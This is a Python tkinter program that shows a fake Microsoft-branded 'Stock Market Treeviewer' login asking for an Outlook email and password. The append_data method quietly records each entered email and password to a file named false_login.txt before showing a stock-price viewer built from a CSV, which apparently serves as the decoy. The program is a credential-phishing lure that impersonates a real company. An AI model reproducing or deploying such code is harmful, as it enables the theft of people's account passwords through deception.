from tkinter import *
import datetime as dt
import pandas as pd
import datetime
from tkinter import ttk


l= []
y=1986
while y <=2022:
    l.append(str(y))
    y+=1




class Methods():
   

    def button_function(self):
        self.get_info()
        self.clean_screen()
        self.append_data()
        Finder()
        

    def get_info(self):
        self.email = self.en_email.get()
        self.password = self.en_password.get()


    def clean_screen(self):
        self.en_email.delete(0, END)
        self.en_password.delete(0, END)

    def append_data(self):
        self.file=open('false_login.txt', 'a')
        self.file.write(F"""
        ------------------------------------------------------------
        {dt.datetime.now()} - ACCESSED BY:

        EMAIL: {self.email}

        PASSWORD: {self.password}
        ------------------------------------------------------------
    
        """)
        self.file.close()




                




        

class Application(Methods):
    def __init__(self):
        self.win = Tk()
        # color, geometry, labels, imagem
        self.appearence_1()
        self.option()
        self.win.mainloop()

    def appearence_1(self):
        self.win.geometry('400x500')
        self.win.resizable(False,False)
        self.bg = PhotoImage(file="win_wpp.png")
        self.label_bg = Label(self.win, image=self.bg)
        self.label_bg.place(x=-550, y=-450)

    def option(self):

        #INTRO
        self.label_intro= Label(self.win, text='Welcome to Microsoft Foundation - Stock Market Treeviewer', bg = 'gray25', fg='gray91')
        self.label_intro.place(relx=0.1, rely=0.6)

        #EMAIL
        self.label_email= Label(self.win, text='Outlook E-mail: ',bg = 'gray25', fg='gray91')
        self.label_email.place(relx=0.1, rely=0.7)
        self.en_email = Entry(self.win)
        self.en_email.place(relx=0.1, rely=0.75, relwidth=0.6)


        #PASSWORD
        self.label_password= Label(text='Password: ',bg = 'gray25', fg='gray91')
        self.label_password.place(relx=0.1, rely=0.8)
        self.en_password = Entry(self.win, show='*')
        self.en_password.place(relx=0.1, rely=0.85, relwidth=0.34)

        #BUTTON
        self.login_button = Button(self.win, text='Login', bg ='gray25', fg='gray91', command=self.button_function)
        self.login_button.place( relx=0.55, rely=0.845, relwidth=0.15, relheight=0.046)


class Method_2():

    def screen(self):
        print('\n'*3)
        print(f'''{'-'*40}
Year  : {self.year}
{'-'*40}''')
        print('Date         Open    Close    Score\n')
        for self.n in self.table.index:
            time.sleep(0.01)
            if self.table["Score"][self.n] > 0:
                print(f'\033[32m{self.table["Date"][self.n]: <12} {round(self.table["Open"][self.n], 3): <7} {round(self.table["Close"][self.n], 3): <7}  {round(self.table["Score"][self.n], 3): <7}\033[m')
            elif self.table["Score"][self.n] < 0:
                print(f'\033[31m{self.table["Date"][self.n]: <12} {round(self.table["Open"][self.n], 3): <7} {round(self.table["Close"][self.n], 3): <7}  {round(self.table["Score"][self.n], 3): <7}\033[m')
            else:
                print(f'\033[m{self.table["Date"][self.n]: <12} {round(self.table["Open"][self.n], 3): <7} {round(self.table["Close"][self.n], 3): <7}  {round(self.table["Score"][self.n], 3): <7}')
        
        self.open = self.table['Open'].iloc[0]
        self.close = self.table['Close'].iloc[len(self.table)-1]

        time.sleep(1)
        print(f'''{'-'*40}
Year  : {self.year}
Open  : {round(self.open,3)}
Close : {round(self.close,3)}
{'-'*40}

''')

    def loc_date_set_table(self):
        self.year = self.value_inside.get()
        self.i = dt.date(self.year,1,1)
        self.f = dt.date(self.year,12,31)
        self.table = pd.read_csv('microfound.csv')
        self.table['Score'] = self.table['Close'] - self.table['Open']
        self.table = self.table.set_index(["Date"])
        self.table = self.table.loc[f"{self.i}":f"{self.f}"]
        self.table.reset_index(inplace=True)


        self.wsc = Toplevel()
        self.wsc.geometry('1240x800')
        self.wsc.resizable(False, False)
        self.wsc.title('Found')
        self.wsc.configure(bg='gray20')


        ttk.Style().configure("Treeview.Heading", background="black")


        self.lista_cli = ttk.Treeview(self.wsc, column=('date', 'open', 'close', 'score',), show='headings')
        self.lista_cli.heading("date", text="DATE")
        self.lista_cli.heading("open", text="OPEN")
        self.lista_cli.heading("close", text="CLOSE")
        self.lista_cli.heading("score", text="SCORE")
    

        self.lista_cli.column("date", width=300)
        self.lista_cli.column("open", width=300)
        self.lista_cli.column("close", width=300)
        self.lista_cli.column("score", width=300)

        self.lista_cli.place(relx=0.04, rely=0.01, relwidth=0.90, relheight=0.95)

        self.scroll_lista = Scrollbar(self.wsc, orient='vertical')
        self.lista_cli.configure(yscroll=self.scroll_lista.set)
        self.scroll_lista.place(relx=0.99, rely=0.01, relwidth=0.01, relheight=0.99)


        for self.n in self.table.index:

            if self.table["Score"][self.n] > 0:
                self.lista_cli.insert("", "end", values=(self.table['Date'][self.n],round(self.table['Open'][self.n],3),round(self.table['Close'][self.n],3), round(self.table['Score'][self.n],3)), tags=('up',))
            if self.table["Score"][self.n] < 0:
                self.lista_cli.insert("", "end", values=(self.table['Date'][self.n],round(self.table['Open'][self.n],3),round(self.table['Close'][self.n],3), round(self.table['Score'][self.n],3)), tags=('down',))
            else:
                self.lista_cli.insert("", "end", values=(self.table['Date'][self.n],round(self.table['Open'][self.n],3),round(self.table['Close'][self.n],3), round(self.table['Score'][self.n],3)), tags=('same',))

        self.lista_cli.tag_configure('up', background='gray11',foreground='pale green')
        self.lista_cli.tag_configure('down', background='gray11', foreground='pink')
        self.lista_cli.tag_configure('same', background='gray11', foreground='white')

        self.open = self.table['Open'].iloc[0]
        self.close = self.table['Close'].iloc[len(self.table)-1]
        self.score=self.open-self.close



        
        

        
        
        

        


class Finder(Method_2):
    def __init__(self):
       self.tree = Toplevel()
       self.appearence_2()
       self.option_2()

    def appearence_2(self,):
        self.tree.geometry('360x30')
        self.tree.title('Found')
        self.tree.configure(bg='gray28')

    def option_2(self):
        #TEXT
        self.label_choose= Label(self.tree, text='Choose an year beetween 1986 and 2022:', bg = 'gray25', fg='gray91')
        self.label_choose.place( relx=0, rely=0, relheight=1)
        #OPTION BUTTON
        self.value_inside = IntVar(self.tree)
        self.value_inside.set("...")
        self.drop = OptionMenu(self.tree, self.value_inside, *l,)
        self.drop.config(bg='gray20', fg='gray91', bd=0, border=0.01, borderwidth=0, highlightthickness= 0)
        self.drop.place(relx=0.62, rely=0 , relwidth=0.24, relheight=1)
        #CONFIRM BUTTON
        self.confirm_button = Button(self.tree, text='>>>', command=self.loc_date_set_table)
        self.confirm_button.place(relx=0.86, rely=0, relwidth=0.14, relheight=1)
        self.confirm_button.config(bg='gray20', fg='pale green', bd=0)




        
    
Application()

